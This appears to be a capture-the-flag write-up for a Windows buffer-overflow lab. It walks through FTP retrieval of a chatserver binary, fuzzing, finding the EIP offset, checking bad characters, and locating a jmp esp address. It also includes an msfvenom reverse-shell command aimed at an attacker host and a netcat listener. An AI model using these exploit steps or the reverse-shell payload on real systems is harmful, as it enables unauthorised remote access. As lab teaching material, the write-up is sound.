# Brainstorm

### Tasks:

1. **Deploy Machine and Scan Network**:
   1. Scan with nmap as usual : `nmap -sC -sV -T5 ip`
2.  **Accessing Files**:

    1. From nmap scan , ftp port open at 22, connect using `ftp ip` and anonymous:anonymous as credentials. `cd chatserver`, `bin`, `mget *` and `quit`. - chatserver.exe and essfunc.dll downloaded.
    2. `nc ip 9999` - some chatserver is running, it might be the chatserver.exe we just downloaded through FTP.


3. **Access**:
   1. Transfer both [exe](https://transfer.sh/PA1HHq/chatserver.exe) and [dll](https://transfer.sh/6tX6aS/essfunc.dll) to windows machine.
   2. Executing exe, it takes 2 input (username and message) , username limits to 20 character, we can safely assume that message is where the bufferoverflow might be.
   3. Start debugging the chatserver with Immunity Debugger.
   4. Each time you are running python script, you will need to restart program in Immunity debugger.
   5. Use [fuzz.py](https://gist.github.com/jayateertha043/e11a338d2a0683ddd49ae01373d655f3) to determine length of buffer when program crashes \~ 2100
   6. Generate cyclic string using [online tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) or using metasploit framework pattern\__create.rb and use the cyclic string as buffer in _[_offset\_finder.py_](https://gist.github.com/jayateertha043/0a3651e5d79e0323c174a4ae2d9b9309)_ _and run offset\_finder.py after restarting chatserver in immunity debugger, when the program crashes  note down the value of EIP register and enter the value in the [online tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) or pattern\_offset.rb. You will get the resultant exact offset value where the buffer was overflowed - 2012.
   7. Run [bad\_char.py](https://gist.github.com/jayateertha043/51a8e5ff9984e85f80fcfdb36572bea9) , again when program crashes look for missing bad characters if any by following ESP stack dump. If any of them is missing or not in order, try removing them from bad\_char.py and repeat till all the bad characters are in same order as sent. - In this case only bad character was \x00 - null character.
   8. Run `!mona modules` in Immunity debugger to find dll and exe running without any additional security protections such as ASLR and DEP - chatserver.exe and essfunc.dll
   9. Run `!mona find -s "\xff\xe4" -m essfunc.dll` to find address of jmp esp instruction inside essfunc.dll, there will be multiple such address you can pick any of them (make sure there are no bad chars at this address) - 625014DF
   10. Convert the address obtained to little endian format  - "\xdf\x14\x50\x62" and we can use this as value of eip when we later use exploit.py.
   11. Generate msfvenom payload - `msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKERIP LPORT=4444 -b '\x00' -f py` and copy the payload replace it in [exploit.py](https://gist.github.com/jayateertha043/5cb8f71cf3e2067d81cf201973420483).
   12. Start netcat listener - `nc -nlvp 4444`
   13. Run `python exploit.py` to get shell in netcat.
   14. `cd C:\Users\drake\\Desktop` and `type root.txt` to get flag and submit !!!
